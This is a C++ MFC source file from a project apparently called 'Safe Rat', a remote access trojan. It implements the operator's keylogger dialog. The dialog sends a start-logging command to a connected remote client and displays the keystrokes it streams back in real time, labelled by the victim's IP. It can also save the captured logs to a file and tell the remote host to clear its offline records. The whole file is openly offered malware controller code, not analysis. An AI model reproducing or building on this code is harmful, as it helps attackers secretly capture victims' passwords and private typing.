// CKeyBoard.cpp: 实现文件
//

#include "pch.h"
#include "Safe Rat.h"
#include "CKeyBoard.h"
#include "afxdialogex.h"


// CKeyBoard 对话框

IMPLEMENT_DYNAMIC(CKeyBoard, CDialogEx)

CKeyBoard::CKeyBoard(CWnd* pParent /*=NULL*/, CHpTcpServer* pIOCPServer, ClientContext *pContext)
	: CDialogEx(IDD_KEYBOARD, pParent)
{
	m_iocpServer = pIOCPServer;
	m_pContext = pContext;
	m_hIcon = LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDI_ICON_KEYBOARD));
	m_bOnClose = FALSE;

}

CKeyBoard::~CKeyBoard()
{
}

void CKeyBoard::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);

	DDX_Control(pDX, IDC_EDIT2, m_key_edit);
	DDX_Control(pDX, IDC_BUTTON4, m_del_key);
	DDX_Control(pDX, IDC_BUTTON3, m_get);
}


BEGIN_MESSAGE_MAP(CKeyBoard, CDialogEx)
	ON_WM_SIZE()
	ON_WM_CLOSE()
	ON_BN_CLICKED(IDC_BUTTON4, &CKeyBoard::OnBnClickedButton4)
	ON_BN_CLICKED(IDC_BUTTON3, &CKeyBoard::OnBnClickedButton3)
END_MESSAGE_MAP()


// CKeyBoard 消息处理程序
void CKeyBoard::OnReceiveComplete()
{
	if (m_bOnClose) 	return;

	switch (m_pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
	{

		case TOKEN_KEYBOARD_DATA:
		{
			CString strResult = (TCHAR*)m_pContext->m_DeCompressionBuffer.GetBuffer(1);
			DWORD datalen = m_pContext->m_DeCompressionBuffer.GetBufferLen()-1;
			strResult = strResult.Left(datalen);


			DWORD strlen = strResult.GetLength();
			int	len = m_key_edit.GetWindowTextLength();
			m_key_edit.SetSel(len, len);
			m_key_edit.ReplaceSel(strResult);   //替换当前选中文本 也就属于追加数据了
		}
		break;
		default:
			break;
	}

}

void CKeyBoard::OnSize(UINT nType, int cx, int cy)
{
	CDialogEx::OnSize(nType, cx, cy);

	// TODO: 在此处添加消息处理程序代码
}


void CKeyBoard::OnClose()
{
	m_iocpServer->Disconnect(m_pContext);
	m_bOnClose = TRUE;
	CDialogEx::OnClose();
}

BOOL CKeyBoard::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	SetIcon(m_hIcon, TRUE);			// 设置大图标
	SetIcon(m_hIcon, FALSE);		// 设置小图标

	CString str;
	str.Format("%s - 实时记录", m_pContext->m_RemoteIP);
	SetWindowText(str);

	BYTE bToken = COMMAND_KEYBOARD_LOGSTART;
	m_iocpServer->Send(m_pContext, &bToken, 1);

	return TRUE;  // return TRUE unless you set the focus to a control
				  // 异常: OCX 属性页应返回 FALSE
}

void CKeyBoard::PostNcDestroy()
{
	if (!m_bOnClose)
		OnClose();
	CDialogEx::PostNcDestroy();
	delete this;
}




//清空剪切板离线记录
void CKeyBoard::OnBnClickedButton4()
{
	BYTE bToken = COMMAND_CLIPBOARD_DEL;
	m_iocpServer->Send(m_pContext, &bToken, 1);
	m_key_edit.SetWindowText("");
}



//获取离线记录
void CKeyBoard::OnBnClickedButton3()
{
	// TODO: Add your control notification handler code here
	CString PathName;
	CString strTime = CTime::GetCurrentTime().Format("%Y%m%d%H%M%S");
	PathName.Format("键盘%s.txt", strTime);

	CFileDialog dlg(FALSE, _T("txt"), PathName, OFN_OVERWRITEPROMPT, "文本文档(*.txt)|*.txt|", this);
	dlg.m_ofn.lpstrTitle = _T("键盘记录保存");
	if (dlg.DoModal() != IDOK)
		return;

	CFile	file;
	if (!file.Open(dlg.GetPathName(), CFile::modeWrite | CFile::modeCreate))
	{
		MessageBox("文件保存失败!", "提示...", MB_ICONINFORMATION);
		return;
	}
	// Write the DIB header and the bits
	CString	strRecord;
	m_key_edit.GetWindowText(strRecord);
	file.Write(strRecord, strRecord.GetLength());
	file.Close();
	return;
}


BOOL CKeyBoard::PreTranslateMessage(MSG* pMsg)
{
	if (
		pMsg->message == WM_KEYDOWN		
		&&(	pMsg->wParam == VK_ESCAPE	 
		||	pMsg->wParam == VK_CANCEL	
		||	pMsg->wParam == VK_RETURN	
		))
		return TRUE;

	return CDialogEx::PreTranslateMessage(pMsg);
}
